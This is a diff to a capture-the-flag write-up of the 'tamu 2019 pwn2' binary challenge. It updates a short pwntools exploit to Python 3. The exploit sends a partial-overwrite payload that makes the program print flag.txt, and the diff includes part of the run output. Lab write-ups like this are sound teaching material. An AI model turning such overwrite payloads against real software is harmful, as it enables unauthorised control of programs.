@@ -1,6 +1,6 @@
 # tamu 2019 pwn2
 
-The goal of this challenge is to get the challenge to print the contents of `flag.txt`, not popping a shell.
+This was done on `Ubuntu 20.04.4 LTS`. The goal of this challenge is to get the challenge to print the contents of `flag.txt`, not popping a shell.
 
 Let's take a look at the binary:
 
@@ -209,7 +209,7 @@ target = process('./pwn2')
 #gdb.attach(target, gdbscript='pie b *0x7bc')
 
 # Make and send the payload
-payload = "0"*0x1e + "\xd8"
+payload = b"0"*0x1e + b"\xd8"
 target.sendline(payload)
 
 target.interactive()
@@ -218,8 +218,8 @@ target.interactive()
 When we run it:
 
 ```
-$    python exploit.py
-[+] Starting local process './pwn2': pid 11453
+$   python3 exploit.py 
+[+] Starting local process './pwn2': pid 4997
 [*] Switching to interactive mode
 Which function would you like to call?
 This function is still under development.
